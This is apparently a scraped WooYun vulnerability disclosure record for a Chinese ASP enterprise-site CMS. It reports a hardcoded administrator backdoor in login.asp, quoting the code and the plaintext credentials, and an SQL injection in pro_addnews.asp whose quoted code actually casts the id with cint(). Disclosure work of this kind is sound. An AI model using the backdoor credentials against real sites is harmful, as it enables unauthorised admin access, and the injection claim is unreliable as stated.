{"id": 11620, "wybug_id": "wooyun-2013-021455", "wybug_title": "深蓝企业网站管理系统SQL注射/非授权登陆后门", "wybug_corp": "深蓝企业网站管理系统", "wybug_author": "ctgpmc", "wybug_date": "2013-04-09 15:55", "wybug_open_date": "2013-07-08 15:56", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-06-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-08：\t细节向公众公开  简要描述： 问题文件:pro_addnews.asplogin.asp 详细说明：  login.asp代码如下：\nIf ytss_use <> \"\" And ytss_Pword <> \"\" Then\t\t\t\tif ytss_use=\"lty696\" and md5(ytss_Pword)=\"ae68b0f59186f263\" then\t\t\t\t\tSession(\"admin_User\") = \"lty\"\t\t\t\t\tsession(\"admin_type\") = \"lty696\"\t\t\t\t\tResponse.Redirect \"tz_admin_index.asp\"//很明显的后门，用户名为lty696  密码：841122\npro_addnews.asp\n代码如下\tid=trim(request.QueryString(\"id\"))\tif request.QueryString(\"action\")=\"modi\" and id<>\"\" then\tdim modi\tmodi=\"y\"\t\tset rsok=server.createobject(\"adodb.recordset\")\t\tsqlok=\"select * from product where id=\"&cint(trim(request.QueryString(\"id\")))\t\trsok.open sqlok,conn,1,1//对ID未进行过滤直接提交数据库查询造成注入\n   漏洞证明：  \n\n   修复方案：  删除后门代码，添加防注入程序   版权声明：转载请注明来源 ctgpmc@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-04-12 16:27 厂商回复： CNVD通过本地测试确认复现所述情况，对于版本情况及下载源情况正进行排查。列入处置队列，在下周协调软件开发方处置，也请白帽子提供他们的联系方式。按后门事件和SQL注入评分，目前还未能提取软件应用检测特征，暂无法评估影响情况，rank=8+7=15 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-09 14:18 |    \t\tIXY \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:3        | 小菜来学习的)\t\t \n  我在站长之家下到的一个也有这个后门不过网上百度来的三个登录却不行不知道是不是版本问题还是管理员修改了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}